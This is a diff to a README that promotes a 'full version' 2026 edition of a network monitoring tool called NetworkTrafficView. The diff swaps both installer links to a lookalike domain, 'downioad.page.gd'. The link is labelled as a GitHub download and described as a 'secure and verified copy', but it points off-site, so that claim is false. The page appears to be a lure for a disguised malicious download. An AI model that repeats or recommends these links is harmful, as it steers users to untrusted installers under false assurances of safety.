@@ -2,7 +2,7 @@
 
 NetworkTrafficView is a powerful network monitoring tool designed for Windows 10 and 11 systems, offering comprehensive insights into network activity. This 2026 enhanced edition provides a full version download with all features enabled, allowing users to track, analyze, and manage traffic efficiently. Whether for personal use or professional administration, this tool delivers real-time data to optimize your network experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -66,7 +66,7 @@ To maximize the benefits of NetworkTrafficView, consider these helpful suggestio
 
 For the most current version of NetworkTrafficView with all features included, visit the download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link provides direct access to the installer and ensures you receive a secure and verified copy of the software. Always download from official sources to maintain system integrity.
 
